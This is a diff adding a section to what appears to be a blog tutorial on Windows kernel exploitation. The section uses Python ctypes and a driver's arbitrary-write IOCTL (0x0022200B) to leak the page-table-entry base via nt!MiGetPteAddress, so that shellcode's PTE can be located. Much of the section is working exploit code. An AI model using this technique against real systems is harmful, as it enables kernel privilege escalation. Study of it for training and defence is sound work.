@@ -267,4 +267,43 @@ Thirdly, we declare a `c_void_p()` to store the value pointed to by `nt!MiGetPte
 base_of_ptes_pointer = c_void_p()
 ```
 
-Fourthly,
+Fourthly, we create our structure with our "what" value and our "where" value which writes the actual address of `nt!MiGetPteAddress+0x13` into our declared pointer.
+
+```python
+# Write-what-where structure #1
+www_pte_base = WriteWhatWhere_PTE_Base()
+www_pte_base.What_PTE_Base = pte_base
+www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
+www_pte_pointer = pointer(www_pte_base)
+```
+
+Then, we make an IOCTL call to the routine that jumps to the arbitrary write in the driver.
+
+```python
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x0022200B,                         # dwIoControlCode
+    www_pte_pointer,                    # lpInBuffer
+    0x8,                                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
+```
+
+A little Python ctypes magic here on dereferencing pointers.
+
+```python
+# CTypes way of dereferencing a C void pointer
+base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]
+```
+
+The above snippet of code will read in the `c_void_p()` (which contains the base of the PTEs) and store it in the variable `base_of_ptes`.
+
+Utilizing the base of the PTEs, we can now dynamically retrieve the location of our shellcode's PTE by putting all of the code together!.
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_13.png" alt="">
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_LEAK.png" alt="">
